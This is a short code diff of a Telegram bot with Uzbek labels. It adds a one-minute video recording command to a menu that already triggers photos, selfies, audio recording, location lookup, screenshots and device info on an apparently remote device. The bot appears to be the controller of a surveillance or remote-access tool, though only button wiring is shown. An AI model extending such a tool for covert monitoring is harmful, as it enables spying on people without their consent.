@@ -45,7 +45,7 @@ dp  = Dispatcher()
 def get_main_keyboard():
     kb = [
         [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="🤳 Selfie")],
-        [KeyboardButton(text="🎙 Ovoz yozish (10 sek)")],
+        [KeyboardButton(text="🎙 Ovoz yozish (10 sek)"), KeyboardButton(text="🎥 1 Daqiqalik Video")],
         [KeyboardButton(text="📍 Manzilni aniqlash")],
         [KeyboardButton(text="📸 Ekran rasmi")],
         [KeyboardButton(text="🔋 Batareya"), KeyboardButton(text="📱 Qurilma info")],
@@ -70,7 +70,7 @@ async def start_handler(message: types.Message):
 
 @dp.message(F.text.in_({
     "📸 Rasm olish", "🤳 Selfie",
-    "🎙 Ovoz yozish (10 sek)",
+    "🎙 Ovoz yozish (10 sek)", "🎥 1 Daqiqalik Video",
     "📍 Manzilni aniqlash",
     "📸 Ekran rasmi",
     "🔋 Batareya", "📱 Qurilma info"
@@ -91,6 +91,7 @@ async def action_handler(message: types.Message):
         "📸 Rasm olish":        "take_photo",
         "🤳 Selfie":            "selfie",
         "🎙 Ovoz yozish (10 sek)": "record_audio",
+        "🎥 1 Daqiqalik Video": "record_video",
         "📍 Manzilni aniqlash":   "get_location",
         "📸 Ekran rasmi":       "get_screenshot",
         "🔋 Batareya":          "battery",
